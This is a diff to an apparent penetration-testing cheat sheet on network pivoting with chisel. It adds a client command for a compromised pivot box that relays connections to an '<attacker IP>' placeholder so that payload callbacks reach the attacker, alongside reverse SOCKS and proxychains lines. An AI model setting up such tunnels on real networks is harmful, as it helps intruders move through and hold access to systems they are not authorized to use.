@@ -119,6 +119,7 @@ int main(int argc, char *argv[])
 * `chisel client <chisel server IP>:<PORT> R:socks`
 * don't forget to add it to your proxychains4.conf file:
 	* `socks5   127.0.0.1 1080`
+ * `./chisel client --fingerprint <chisel server fingerprint> <attacker IP>:8080 0.0.0.0:9999:<attacker IP>:9999` this command is running on the pivot box, in the commands the `0.0.0.0:9999` is for the pivot box so it's listening on all interfaces on port 9999 and when receives a connection it forwards it back to the attacker's machine. The payload is generated so the callback will be to the pivot box.
 
 ## Cleaning up
 
